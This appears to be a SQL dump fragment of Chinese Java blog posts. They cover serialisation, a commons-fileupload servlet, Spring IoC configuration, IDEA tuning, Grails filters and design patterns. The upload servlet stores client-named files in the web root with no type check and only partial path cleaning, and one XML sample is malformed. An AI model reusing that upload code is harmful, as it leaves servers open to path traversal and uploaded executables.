1.安全方面的原因，比如一个对象拥有private，public等field，对于一个要传输的对象，比如写到文件，或者进行rmi传输 等等，在序列化进行传输的过程中，这个对象的private等域是不受保护的。\r\n  2. 资源分配方面的原因，比如socket，thread类，如果可以序列化，进行传输或者保存，也无法对他们进行重新的资源分 配，而且，也是没有必要这样实现。</pre>\r\n','20150418212811',0,5,0,2),(11,'<p>实现将本地硬盘的文件上传至服务器，需要用到的jar包有：commons-fileupload.jar 和 commons-io.jar。</p>\r\n\r\n<p>首先是一个jsp页面，用来选择文件：</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">\r\n&lt;body&gt;  \r\n\r\n    &lt;form name=\"uploadForm\" method=\"post\" enctype=\"multipart/form-data\" action=\"uploadServletDemo\"&gt;  \r\n\r\n        Name:&lt;input type=\"text\" name=\"username\"/&gt; &lt;br /&gt;  \r\n\r\n        File1:&lt;input type=\"file\" name=\"file1\"/&gt; &lt;br /&gt;  \r\n\r\n        File2:&lt;input type=\"file\" name=\"file2\"/&gt; &lt;br /&gt;  \r\n\r\n        &lt;input type=\"submit\" name=\"submit\" value=\"上传\"&gt;   \r\n\r\n        &lt;input type=\"reset\" name=\"reset\" value=\"重置\"&gt;  \r\n\r\n    &lt;/form&gt;  \r\n\r\n&lt;/body&gt;  \r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>然后是一个servlet，用来处理页面传来的数据：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package servlet;  \r\n\r\n  \r\n\r\nimport javax.servlet.*;    \r\n\r\nimport javax.servlet.http.*;    \r\n\r\nimport java.io.*;    \r\n\r\nimport java.util.*;    \r\n\r\nimport org.apache.commons.fileupload.*;  \r\n\r\nimport org.apache.commons.fileupload.servlet.*;    \r\n\r\nimport org.apache.commons.fileupload.disk.*;  \r\n\r\n  \r\n\r\n  \r\n\r\npublic class uploadServletDemo extends HttpServlet {  \r\n\r\n    /** \r\n\r\n     *  \r\n\r\n     */  \r\n\r\n    private static final long serialVersionUID = 1L;  \r\n\r\n      \r\n\r\n    private String filePath;    // 文件存放目录    \r\n\r\n    private String tempPath;    // 临时文件目录    \r\n\r\n   \r\n\r\n    // 初始化    \r\n\r\n    public void init(ServletConfig config) throws ServletException    \r\n\r\n    {    \r\n\r\n        super.init(config);    \r\n\r\n        // 从配置文件中获得初始化参数    \r\n\r\n        filePath = config.getInitParameter(\"filepath\");    \r\n\r\n        tempPath = config.getInitParameter(\"temppath\");    \r\n\r\n   \r\n\r\n        ServletContext context = getServletContext();    \r\n\r\n   \r\n\r\n        filePath = context.getRealPath(filePath);    \r\n\r\n        tempPath = context.getRealPath(tempPath);    \r\n\r\n          \r\n\r\n        //如果路径不存在，则创建路径  \r\n\r\n        File pathFile = new File(filePath);  \r\n\r\n        File pathTemp = new File(tempPath);  \r\n\r\n        if(!pathFile.exists()){  \r\n\r\n            pathFile.mkdirs();  \r\n\r\n        }  \r\n\r\n        if(!pathTemp.exists()){  \r\n\r\n            pathTemp.mkdirs();  \r\n\r\n        }  \r\n\r\n        System.out.println(\"文件存放目录、临时文件目录准备完毕 ...\");    \r\n\r\n    }    \r\n\r\n        \r\n\r\n    // doPost    \r\n\r\n    public void doPost(HttpServletRequest req, HttpServletResponse res)    \r\n\r\n        throws IOException, ServletException    \r\n\r\n    {    \r\n\r\n        res.setContentType(\"text/plain;charset=gbk\");    \r\n\r\n        PrintWriter pw = res.getWriter();    \r\n\r\n        try{    \r\n\r\n            DiskFileItemFactory diskFactory = new DiskFileItemFactory();    \r\n\r\n            // threshold 极限、临界值，即硬盘缓存 1G   \r\n\r\n            diskFactory.setSizeThreshold(1000 * 1024 * 1024);    \r\n\r\n            // repository 贮藏室，即临时文件目录    \r\n\r\n            diskFactory.setRepository(new File(tempPath));    \r\n\r\n            \r\n\r\n            ServletFileUpload upload = new ServletFileUpload(diskFactory);    \r\n\r\n            // 设置允许上传的最大文件大小 1G   \r\n\r\n            upload.setSizeMax(1000 * 1024 * 1024);    \r\n\r\n            // 解析HTTP请求消息头    \r\n\r\n            List&lt;FileItem&gt; fileItems = upload.parseRequest(new ServletRequestContext(req));    \r\n\r\n            Iterator&lt;FileItem&gt; iter = fileItems.iterator();    \r\n\r\n            while(iter.hasNext())    \r\n\r\n            {    \r\n\r\n                FileItem item = (FileItem)iter.next();    \r\n\r\n                if(item.isFormField())    \r\n\r\n                {    \r\n\r\n                    System.out.println(\"处理表单内容 ...\");    \r\n\r\n                    processFormField(item, pw);    \r\n\r\n                }else{    \r\n\r\n                    System.out.println(\"处理上传的文件 ...\");    \r\n\r\n                    processUploadFile(item, pw);    \r\n\r\n                }    \r\n\r\n            }// end while()    \r\n\r\n   \r\n\r\n            pw.close();    \r\n\r\n        }catch(Exception e){    \r\n\r\n            System.out.println(\"使用 fileupload 包时发生异常 ...\");    \r\n\r\n            e.printStackTrace();    \r\n\r\n        }// end try ... catch ...    \r\n\r\n    }// end doPost()    \r\n\r\n   \r\n\r\n   \r\n\r\n    // 处理表单内容    \r\n\r\n    private void processFormField(FileItem item, PrintWriter pw)    \r\n\r\n        throws Exception    \r\n\r\n    {    \r\n\r\n        String name = item.getFieldName();    \r\n\r\n        String value = item.getString();            \r\n\r\n        pw.println(name + \" : \" + value + \"\\r\\n\");    \r\n\r\n    }    \r\n\r\n        \r\n\r\n    // 处理上传的文件    \r\n\r\n    private void processUploadFile(FileItem item, PrintWriter pw)    \r\n\r\n        throws Exception    \r\n\r\n    {    \r\n\r\n        // 此时的文件名包含了完整的路径，得注意加工一下    \r\n\r\n        String filename = item.getName();           \r\n\r\n        System.out.println(\"完整的文件名：\" + filename);    \r\n\r\n        int index = filename.lastIndexOf(\"\\\\\");    \r\n\r\n        filename = filename.substring(index + 1, filename.length());    \r\n\r\n   \r\n\r\n        long fileSize = item.getSize();    \r\n\r\n   \r\n\r\n        if(\"\".equals(filename) &amp;&amp; fileSize == 0)    \r\n\r\n        {               \r\n\r\n            System.out.println(\"文件名为空 ...\");    \r\n\r\n            return;    \r\n\r\n        }    \r\n\r\n   \r\n\r\n        File uploadFile = new File(filePath + \"/\" + filename);    \r\n\r\n        if(!uploadFile.exists()){  \r\n\r\n            uploadFile.createNewFile();  \r\n\r\n        }  \r\n\r\n        item.write(uploadFile);    \r\n\r\n        pw.println(filename + \" 文件保存完毕 ...\");    \r\n\r\n        pw.println(\"文件大小为 ：\" + fileSize + \"\\r\\n\");    \r\n\r\n    }    \r\n\r\n        \r\n\r\n    // doGet    \r\n\r\n    public void doGet(HttpServletRequest req, HttpServletResponse res)    \r\n\r\n        throws IOException, ServletException    \r\n\r\n    {    \r\n\r\n        doPost(req, res);    \r\n\r\n    }    \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>然后就是配置文件web.xml：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[html]</strong>&nbsp;view plaincopy</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;servlet&gt;  \r\n\r\n        &lt;servlet-name&gt;uploadServletDemo&lt;/servlet-name&gt;  \r\n\r\n        &lt;servlet-class&gt;servlet.uploadServletDemo&lt;/servlet-class&gt;  \r\n\r\n        &lt;init-param&gt;  \r\n\r\n            &lt;param-name&gt;filepath&lt;/param-name&gt;  \r\n\r\n            &lt;param-value&gt;uploadFile&lt;/param-value&gt;  \r\n\r\n        &lt;/init-param&gt;  \r\n\r\n        &lt;init-param&gt;  \r\n\r\n            &lt;param-name&gt;temppath&lt;/param-name&gt;  \r\n\r\n            &lt;param-value&gt;temp&lt;/param-value&gt;  \r\n\r\n        &lt;/init-param&gt;  \r\n\r\n    &lt;/servlet&gt;  \r\n\r\n    &lt;servlet-mapping&gt;   \r\n\r\n        &lt;servlet-name&gt;uploadServletDemo&lt;/servlet-name&gt;   \r\n\r\n        &lt;url-pattern&gt;/uploadServletDemo&lt;/url-pattern&gt;   \r\n\r\n    &lt;/servlet-mapping&gt;   \r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>测试的时候访问当前项目下的upload.jsp页面即可。</p>\r\n','20150418212949',0,3,0,2),(12,'<p>平常的java开发中，程序员在某个类中需要依赖其它类的方法，则通常是new一个依赖类再调用类实例的方法，这种开发存在的问题是new的类实例不好统一管理，spring提出了依赖注入的思想，即依赖类不由程序员实例化，而是通过spring容器帮我们new指定实例并且将实例注入到需要该对象的类中。依赖注入的另一种说法是&ldquo;控制反转&rdquo;，通俗的理解是：平常我们new一个实例，这个实例的控制权是我们程序员，而控制反转是指new实例工作不由我们程序员来做而是交给spring容器来做。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>spring有多种依赖注入的形式，下面仅介绍spring通过xml进行IOC配置的方式：</p>\r\n\r\n<p>Set注入</p>\r\n\r\n<p>这是最简单的注入方式，假设有一个SpringAction，类中需要实例化一个SpringDao对象，那么就可以定义一个private的SpringDao成员变量，然后创建SpringDao的set方法（这是ioc的注入入口）：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.bless.springdemo.action;  \r\n\r\npublic class SpringAction {  \r\n\r\n        //注入对象springDao  \r\n\r\n    private SpringDao springDao;  \r\n\r\n        //一定要写被注入对象的set方法  \r\n\r\n        public void setSpringDao(SpringDao springDao) {  \r\n\r\n        this.springDao = springDao;  \r\n\r\n    }  \r\n\r\n  \r\n\r\n        public void ok(){  \r\n\r\n        springDao.ok();  \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>随后编写spring的xml文件，&lt;bean&gt;中的name属性是class属性的一个别名，class属性指类的全名，因为在SpringAction中有一个公共属性Springdao，所以要在&lt;bean&gt;标签中创建一个&lt;property&gt;标签指定SpringDao。&lt;property&gt;标签中的name就是SpringAction类中的SpringDao属性名，ref指下面&lt;bean name=&quot;springDao&quot;...&gt;，这样其实是spring将SpringDaoImpl对象实例化并且调用SpringAction的setSpringDao方法将SpringDao注入：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;!--配置bean,配置后该类由spring管理--&gt;  \r\n\r\n    &lt;bean name=\"springAction\" class=\"com.bless.springdemo.action.SpringAction\"&gt;  \r\n\r\n        &lt;!--(1)依赖注入,配置当前类中相应的属性--&gt;  \r\n\r\n        &lt;property name=\"springDao\" ref=\"springDao\"&gt;&lt;/property&gt;  \r\n\r\n    &lt;/bean&gt;  \r\n\r\n&lt;bean name=\"springDao\" class=\"com.bless.springdemo.dao.impl.SpringDaoImpl\"&gt;&lt;/bean&gt;  \r\n\r\n  </code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>构造器注入</p>\r\n\r\n<p>这种方式的注入是指带有参数的构造函数注入，看下面的例子，我创建了两个成员变量SpringDao和User，但是并未设置对象的set方法，所以就不能支持第一种注入方式，这里的注入方式是在SpringAction的构造函数中注入，也就是说在创建SpringAction对象时要将SpringDao和User两个参数值传进来：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class SpringAction {  \r\n\r\n    //注入对象springDao  \r\n\r\n    private SpringDao springDao;  \r\n\r\n    private User user;  \r\n\r\n      \r\n\r\n    public SpringAction(SpringDao springDao,User user){  \r\n\r\n        this.springDao = springDao;  \r\n\r\n        this.user = user;  \r\n\r\n        System.out.println(\"构造方法调用springDao和user\");  \r\n\r\n    }  \r\n\r\n          \r\n\r\n        public void save(){  \r\n\r\n        user.setName(\"卡卡\");  \r\n\r\n        springDao.save(user);  \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>在XML文件中同样不用&lt;property&gt;的形式，而是使用&lt;constructor-arg&gt;标签，ref属性同样指向其它&lt;bean&gt;标签的name属性：</p>\r\n\r\n<p>Xml代码&nbsp;&nbsp;</p>\r\n\r\n<p>&lt;!--配置bean,配置后该类由spring管理--&gt;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;bean name=\"springAction\" class=\"com.bless.springdemo.action.SpringAction\"&gt;  \r\n\r\n        &lt;!--(2)创建构造器注入,如果主类有带参的构造方法则需添加此配置--&gt;  \r\n\r\n        &lt;constructor-arg ref=\"springDao\"&gt;&lt;/constructor-arg&gt;  \r\n\r\n        &lt;constructor-arg ref=\"user\"&gt;&lt;/constructor-arg&gt;  \r\n\r\n    &lt;/bean&gt;  \r\n\r\n        &lt;bean name=\"springDao\" class=\"com.bless.springdemo.dao.impl.SpringDaoImpl\"&gt;&lt;/bean&gt;  \r\n\r\n         &lt;bean name=\"user\" class=\"com.bless.springdemo.vo.User\"&gt;&lt;/bean&gt;  </code></pre>\r\n\r\n<p>&nbsp; 解决构造方法参数的不确定性，你可能会遇到构造方法传入的两参数都是同类型的，为了分清哪个该赋对应值，则需要进行一些小处理：</p>\r\n\r\n<p>下面是设置index，就是参数位置：</p>\r\n\r\n<p>Xml代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;bean name=\"springAction\" class=\"com.bless.springdemo.action.SpringAction\"&gt;  \r\n\r\n        &lt;constructor-arg index=\"0\" ref=\"springDao\"&gt;&lt;/constructor-arg&gt;  \r\n\r\n        &lt;constructor-arg index=\"1\" ref=\"user\"&gt;&lt;/constructor-arg&gt;  \r\n\r\n    &lt;/bean&gt;  </code></pre>\r\n\r\n<p>&nbsp; 另一种是设置参数类型：</p>\r\n\r\n<p>Xml代码&nbsp;&nbsp;</p>\r\n\r\n<p><strong>&lt;</strong><strong>constructor-arg</strong>&nbsp;type=&quot;java.lang.String&quot;&nbsp;ref=&quot;&quot;<strong>/&gt;</strong>&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>静态工厂的方法注入</p>\r\n\r\n<p>静态工厂顾名思义，就是通过调用静态工厂的方法来获取自己需要的对象，为了让spring管理所有对象，我们不能直接通过&quot;工程类.静态方法()&quot;来获取对象，而是依然通过spring注入的形式获取：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.bless.springdemo.factory;  \r\n\r\n  \r\n\r\nimport com.bless.springdemo.dao.FactoryDao;  \r\n\r\nimport com.bless.springdemo.dao.impl.FactoryDaoImpl;  \r\n\r\nimport com.bless.springdemo.dao.impl.StaticFacotryDaoImpl;  \r\n\r\n  \r\n\r\npublic class DaoFactory {  \r\n\r\n    //静态工厂  \r\n\r\n    public static final FactoryDao getStaticFactoryDaoImpl(){  \r\n\r\n        return new StaticFacotryDaoImpl();  \r\n\r\n    }  \r\n\r\n}  \r\n</code></pre>\r\n\r\n<p>同样看关键类，这里我需要注入一个FactoryDao对象，这里看起来跟第一种注入一模一样，但是看随后的xml会发现有很大差别:</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\"> public class SpringAction {  \r\n\r\n        //注入对象  \r\n\r\n    private FactoryDao staticFactoryDao;  \r\n\r\n      \r\n\r\n    public void staticFactoryOk(){  \r\n\r\n        staticFactoryDao.saveFactory();  \r\n\r\n    }  \r\n\r\n    //注入对象的set方法  \r\n\r\n    public void setStaticFactoryDao(FactoryDao staticFactoryDao) {  \r\n\r\n        this.staticFactoryDao = staticFactoryDao;  \r\n\r\n    }  \r\n\r\n}  </code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Spring的IOC配置文件，注意看&lt;bean name=&quot;staticFactoryDao&quot;&gt;指向的class并不是FactoryDao的实现类，而是指向静态工厂DaoFactory，并且配置 factory-method=&quot;getStaticFactoryDaoImpl&quot;指定调用哪个工厂方法：</p>\r\n\r\n<p>Xml代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-xml\">&lt;!--配置bean,配置后该类由spring管理--&gt;  \r\n\r\n    &lt;bean name=\"springAction\" class=\"com.bless.springdemo.action.SpringAction\" &gt;  \r\n\r\n        &lt;!--(3)使用静态工厂的方法注入对象,对应下面的配置文件(3)--&gt;  \r\n\r\n        &lt;property name=\"staticFactoryDao\" ref=\"staticFactoryDao\"&gt;&lt;/property&gt;  \r\n\r\n                &lt;/property&gt;  \r\n\r\n    &lt;/bean&gt;  \r\n\r\n    &lt;!--(3)此处获取对象的方式是从工厂类中获取静态方法--&gt;  \r\n\r\n    &lt;bean name=\"staticFactoryDao\" class=\"com.bless.springdemo.factory.DaoFactory\" factory-method=\"getStaticFactoryDaoImpl\"&gt;&lt;/bean&gt;  \r\n\r\n      \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n实例工厂的方法注入\r\n\r\n实例工厂的意思是获取对象实例的方法不是静态的，所以你需要首先new工厂类，再调用普通的实例方法：\r\n\r\nJava代码  \r\n\r\npublic class DaoFactory {  \r\n\r\n    //实例工厂  \r\n\r\n    public FactoryDao getFactoryDaoImpl(){  \r\n\r\n        return new FactoryDaoImpl();  \r\n\r\n    }  \r\n\r\n}  \r\n\r\n\r\n\r\n那么下面这个类没什么说的，跟前面也很相似，但是我们需要通过实例工厂类创建FactoryDao对象：\r\n\r\nJava代码  \r\n\r\npublic class SpringAction {  \r\n\r\n    //注入对象  \r\n\r\n    private FactoryDao factoryDao;  \r\n\r\n      \r\n\r\n    public void factoryOk(){  \r\n\r\n        factoryDao.saveFactory();  \r\n\r\n    }  \r\n\r\n  \r\n\r\n    public void setFactoryDao(FactoryDao factoryDao) {  \r\n\r\n        this.factoryDao = factoryDao;  \r\n\r\n    }  \r\n\r\n}  \r\n\r\n\r\n\r\n最后看spring配置文件：\r\n\r\nXml代码  \r\n\r\n&lt;!--配置bean,配置后该类由spring管理--&gt;  \r\n\r\n    &lt;bean name=\"springAction\" class=\"com.bless.springdemo.action.SpringAction\"&gt;  \r\n\r\n        &lt;!--(4)使用实例工厂的方法注入对象,对应下面的配置文件(4)--&gt;  \r\n\r\n        &lt;property name=\"factoryDao\" ref=\"factoryDao\"&gt;&lt;/property&gt;  \r\n\r\n    &lt;/bean&gt;  \r\n\r\n      \r\n\r\n    &lt;!--(4)此处获取对象的方式是从工厂类中获取实例方法--&gt;  \r\n\r\n    &lt;bean name=\"daoFactory\" class=\"com.bless.springdemo.factory.DaoFactory\"&gt;&lt;/bean&gt;  \r\n\r\n    &lt;bean name=\"factoryDao\" factory-bean=\"daoFactory\" factory-method=\"getFactoryDaoImpl\"&gt;&lt;/bean&gt;  \r\n\r\n\r\n</code></pre>\r\n\r\n<p>总结</p>\r\n\r\n<p>Spring&nbsp;IOC注入方式用得最多的是(1)(2)种，多谢多练就会非常熟练。</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp; 另外注意：通过Spring创建的对象默认是单例的，如果需要创建多实例对象可以在&lt;bean&gt;标签后面添加一个属性：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<p>&lt;bean&nbsp;name=&quot;...&quot;&nbsp;<strong>class</strong>=&quot;...&quot;&nbsp;scope=&quot;prototype&quot;&gt;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n','20150418213234',0,1,1,2),(13,'<p>试了半天终于找到一个临时的解决办法，给大家分享一下，第一还是配置jvm的参数，idea(64).exe.vmoptions内容如下：</p>\r\n\r\n<pre>\r\n<code class=\"language-ini\">-Xms1024m\r\n\r\n-Xmx2048m\r\n\r\n-XX:MaxPermSize=512m\r\n\r\n-XX:ReservedCodeCacheSize=256m\r\n\r\n-ea\r\n\r\n-Dsun.io.useCanonCaches=false\r\n\r\n-Dsun.awt.keepWorkingSetOnMinimize=true\r\n\r\n-Djava.net.preferIPv4Stack=true\r\n\r\n-Djsse.enableSNIExtension=false\r\n\r\n-XX:+UseCodeCacheFlushing\r\n\r\n-XX:+UseConcMarkSweepGC\r\n\r\n-XX:SoftRefLRUPolicyMSPerMB=50</code></pre>\r\n\r\n<p>第二步就是关闭代码检查，这个可根据需要关闭一些，代码检查没必要都检查，非常耗费性能，全部关闭后效果明显；关闭方法</p>\r\n\r\n<p>file-&gt;settings-&gt;editor-&gt;inspections&nbsp;</p>\r\n\r\n<p>有其他好的建议希望大家能交流；idea感觉比eclipse还是非常好用的特别是debug</p>\r\n\r\n<p>&nbsp;</p>\r\n','20150418233054',0,16,0,1),(14,'<pre>\r\n<code class=\"language-ini\">dataSource.properties.maxWait = 10000\r\ndataSource.properties.maxActive = 50\r\ndataSource.properties.maxIdle = 25\r\ndataSource.properties.minIdle = 5\r\ndataSource.properties.initialSize = 5\r\ndataSource.properties.minEvictableIdleTimeMillis = 60000\r\ndataSource.properties.timeBetweenEvictionRunsMillis = 60000\r\ndataSource.properties.maxWait = 10000\r\ndataSource.properties.jmxEnabled = true\r\ndataSource.properties.maxAge = 600000\r\ndataSource.properties.validationQuery = \"SELECT 1\"\r\ndataSource.properties.validationQueryTimeout = 3\r\ndataSource.properties.validationInterval = 15000\r\ndataSource.properties.testOnBorrow = true\r\ndataSource.properties.testWhileIdle = true\r\ndataSource.properties.testOnReturn = false\r\ndataSource.properties.jdbcInterceptors = ConnectionState;StatementFinalizer(useEquals=true)\r\ndataSource.properties.defaultTransactionIsolation = 2</code></pre>\r\n\r\n<p>hibernate链接属性修改</p>\r\n','20150419141057',0,17,0,2),(15,'<p>出现这个问题一般都是jar缺少，看一下是什么类找不到，如果是公用的可以把类名发到 www.findjar.com里找</p>\r\n','20150419145346',0,28,0,2),(16,'<p><strong>先摘录一段Java中两者的区别</strong><br />\r\n1、拦截器是基于<u>java</u>的反射机制的，而过滤器是基于函数回调 。<br />\r\n2、过滤器依赖与servlet容器，而拦截器不依赖与servlet容器 。<br />\r\n3、拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用 。（这也就是为什么在Grails文档里，拦截器属于Controlloer章节的一个小节；而过滤器自己是一个章节）<br />\r\n4、拦截器可以访问action上下文、值栈里的对象，而过滤器不能 。<br />\r\n5、在action的生命周期中，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次 。<br />\r\n<br />\r\n<strong>Grails的文档是这样描述的</strong><br />\r\nIf your interceptor is likely to apply to more than&gt;所以，对于登陆验证，filter更加适合，默默的、悄悄的，减少继承。<br />\r\ninterceptor更加适合处理一个controller内的特殊情况。<br />\r\n<br />\r\n<br />\r\n<strong>拦截器</strong><br />\r\nabstract class BaseController {&nbsp; //需要验证的Controller继承之<br />\r\n&nbsp;&nbsp;&nbsp; def be<u>for</u>eInterceptor = [action: this.&amp;auth, except: [&#39;login&#39;]]<br />\r\n<br />\r\n&nbsp;&nbsp;&nbsp; private def auth() {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!session.loginUser) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redirect(controller: &#39;user&#39;, action: &#39;login&#39;)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}<br />\r\n<br />\r\n<strong>过滤器</strong><br />\r\ngrails create-filters security<br />\r\n<br />\r\nclass SecurityFilters {<br />\r\n&nbsp;&nbsp;&nbsp; def filters = {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; loginCheck(controller: &#39;*&#39;, action: &#39;*&#39;, uriExclude: &#39;/user/login&#39;) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; before = {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!session.loginUser) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redirect(controller: &#39;user&#39;, action: &#39;login&#39;)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}<br />\r\n<br />\r\n有趣的测试，如果同时设置了拦截器和过滤器，过滤器（是容器级的）工作在拦截器（Controller级的）之前。</p>\r\n','20150419145425',0,27,0,2),(17,'<p><strong>先摘录一段Java中两者的区别</strong><br />\r\n1、拦截器是基于<u>java</u>的反射机制的，而过滤器是基于函数回调 。<br />\r\n2、过滤器依赖与servlet容器，而拦截器不依赖与servlet容器 。<br />\r\n3、拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用 。（这也就是为什么在Grails文档里，拦截器属于Controlloer章节的一个小节；而过滤器自己是一个章节）<br />\r\n4、拦截器可以访问action上下文、值栈里的对象，而过滤器不能 。<br />\r\n5、在action的生命周期中，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次 。<br />\r\n<br />\r\n<strong>Grails的文档是这样描述的</strong><br />\r\nIf your interceptor is likely to apply to more than&gt;所以，对于登陆验证，filter更加适合，默默的、悄悄的，减少继承。<br />\r\ninterceptor更加适合处理一个controller内的特殊情况。<br />\r\n<br />\r\n<br />\r\n<strong>拦截器</strong></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">abstract class BaseController {  //需要验证的Controller继承之\r\n    def beforeInterceptor = [action: this.&amp;auth, except: [\'login\']]\r\n\r\n    private def auth() {\r\n        if (!session.loginUser) {\r\n            redirect(controller: \'user\', action: \'login\')\r\n            return false\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\n<p><br />\r\n<br />\r\n<strong>过滤器</strong></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">grails create-filters security\r\n\r\nclass SecurityFilters {\r\n    def filters = {\r\n        loginCheck(controller: \'*\', action: \'*\', uriExclude: \'/user/login\') {\r\n            before = {\r\n                if (!session.loginUser) {\r\n                    redirect(controller: \'user\', action: \'login\')\r\n                    return false\r\n                }\r\n            }\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\n<p><br />\r\n<br />\r\n有趣的测试，如果同时设置了拦截器和过滤器，过滤器（是容器级的）工作在拦截器（Controller级的）之前。</p>\r\n','20150419145503',0,27,0,2),(18,'<p>可以使用htmlcleaner插件</p>\r\n\r\n<p>http://grails.org/plugin/html-cleaner</p>\r\n','20150419145619',0,26,0,2),(19,'<p>工厂模式， 工厂方法模式，单例模式， 外观（Facade）模式， 观察者（Observer）模式，桥接（Bridge）模式都是比较常用的，不同的项目有不同的设计方向，可以参考的设计模式也不尽相同，没有定数，只是上面这几个模式用的比较多一些。<br />\r\n其他的模式我找了一下，都列出来了。<br />\r\n&nbsp;<br />\r\n创建型模式&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>1、FACTORY&mdash;追MM少不了请吃饭了，麦当劳的鸡翅和肯德基的鸡翅都是MM爱吃的东西，虽然口味有所不同，但不管你带MM去麦当劳或肯德基，只管向服务员说&ldquo;来四个鸡翅&rdquo;就行了。麦当劳和肯德基就是生产鸡翅的Factory&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;<strong>工厂模式</strong>：客户类和工厂类分开。消费者任何时候需要某种产品，只需向工厂请求即可。消费者无须修改就可以接纳新产品。缺点是当产品修改时，工厂类也要做相应的修改。如：如何创建及如何向客户端提供。&nbsp;<br />\r\n2、BUILDER&mdash;MM最爱听的就是&ldquo;我爱你&rdquo;这句话了，见到不同地方的MM,要能够用她们的方言跟她说这句话哦，我有一个多种语言翻译机，上面每种语言都有一个按键，见到MM我只要按对应的键，它就能够用相应的语言说出&ldquo;我爱你&rdquo;这句话了，国外的MM也可以轻松搞掂，这就是我的&ldquo;我爱你&rdquo;builder。（这一定比美军在伊拉克用的翻译机好卖）&nbsp;<br />\r\n<strong>建造模式</strong>：将产品的内部表象和产品的生成过程分割开来，从而使一个建造过程生成具有不同的内部表象的产品对象。建造模式使得产品内部表象可以独立的变化，客户不必知道产品内部组成的细节。建造模式可以强制实行一种分步骤进行的建造过程。&nbsp;<br />\r\n3、FACTORY METHOD&mdash;请MM去麦当劳吃汉堡，不同的MM有不同的口味，要每个都记住是一件烦人的事情，我一般采用Factory Method模式，带着MM到服务员那儿，说&ldquo;要一个汉堡&rdquo;，具体要什么样的汉堡呢，让MM直接跟服务员说就行了。&nbsp;<br />\r\n<strong>工厂方法模式</strong>：核心工厂类不再负责所有产品的创建，而是将具体创建的工作交给子类去做，成为一个抽象工厂角色，仅负责给出具体工厂类必须实现的接口，而不接触哪一个产品类应当被实例化这种细节。&nbsp;<br 